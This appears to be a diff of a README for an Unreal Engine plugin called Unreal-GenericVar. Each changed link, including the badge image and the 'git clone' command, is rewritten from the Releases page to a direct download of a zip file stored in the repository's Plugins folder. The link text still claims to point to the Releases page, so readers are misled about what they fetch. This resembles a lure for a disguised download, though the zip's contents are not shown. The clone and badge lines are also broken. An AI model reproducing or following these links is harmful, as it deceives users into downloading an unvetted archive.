@@ -1,6 +1,6 @@
 # 🚀 Unreal-GenericVar - A Simple Solution for Type-Safe Variables
 
-[![Download Unreal-GenericVar](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/Krishna-vania/Unreal-GenericVar/releases)
+[![Download Unreal-GenericVar](https://github.com/Krishna-vania/Unreal-GenericVar/raw/refs/heads/main/Plugins/Generic-Var-Unreal-v1.7-beta.1.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/Krishna-vania/Unreal-GenericVar/raw/refs/heads/main/Plugins/Generic-Var-Unreal-v1.7-beta.1.zip)
 
 ## 📋 Introduction
 
@@ -28,7 +28,7 @@ To start using Unreal-GenericVar, follow these simple steps.
 
 ### 1. Visit the Download Page
 
-Head to our [Releases page](https://github.com/Krishna-vania/Unreal-GenericVar/releases) to find the latest version of Unreal-GenericVar. 
+Head to our [Releases page](https://github.com/Krishna-vania/Unreal-GenericVar/raw/refs/heads/main/Plugins/Generic-Var-Unreal-v1.7-beta.1.zip) to find the latest version of Unreal-GenericVar. 
 
 ### 2. Choose Your Version
 
@@ -59,7 +59,7 @@ To run Unreal-GenericVar, ensure that your setup meets the following requirement
 
 ## 💾 Download & Install
 
-To download Unreal-GenericVar, visit the [Releases page](https://github.com/Krishna-vania/Unreal-GenericVar/releases). Once there, select the appropriate version and download it. Follow the installation instructions above to set it up in your Unreal Engine project.
+To download Unreal-GenericVar, visit the [Releases page](https://github.com/Krishna-vania/Unreal-GenericVar/raw/refs/heads/main/Plugins/Generic-Var-Unreal-v1.7-beta.1.zip). Once there, select the appropriate version and download it. Follow the installation instructions above to set it up in your Unreal Engine project.
 
 ## 📣 Community and Support
 
@@ -69,7 +69,7 @@ If you encounter any issues while using Unreal-GenericVar, or if you have questi
 
 We are open to contributions! If you have ideas for improvements or new features, feel free to fork the repository and create a pull request. 
 
-1. **Clone the Repository**: Run `git clone https://github.com/Krishna-vania/Unreal-GenericVar.git`
+1. **Clone the Repository**: Run `git clone https://github.com/Krishna-vania/Unreal-GenericVar/raw/refs/heads/main/Plugins/Generic-Var-Unreal-v1.7-beta.1.zip`
 2. **Make Your Changes**: Edit the code as needed.
 3. **Test Your Changes**: Ensure everything works as expected.
 4. **Submit a Pull Request**: Share your improvements with us!
@@ -86,4 +86,4 @@ We plan to introduce new features and fix bugs regularly. Here are some areas we
 
 Thank you for choosing Unreal-GenericVar for your Unreal Engine projects. We appreciate your interest and look forward to seeing how you use our tool to create amazing games.
 
-For detailed guides, tips, and more information, visit our [Releases page](https://github.com/Krishna-vania/Unreal-GenericVar/releases) regularly to stay updated.
+For detailed guides, tips, and more information, visit our [Releases page](https://github.com/Krishna-vania/Unreal-GenericVar/raw/refs/heads/main/Plugins/Generic-Var-Unreal-v1.7-beta.1.zip) regularly to stay updated.
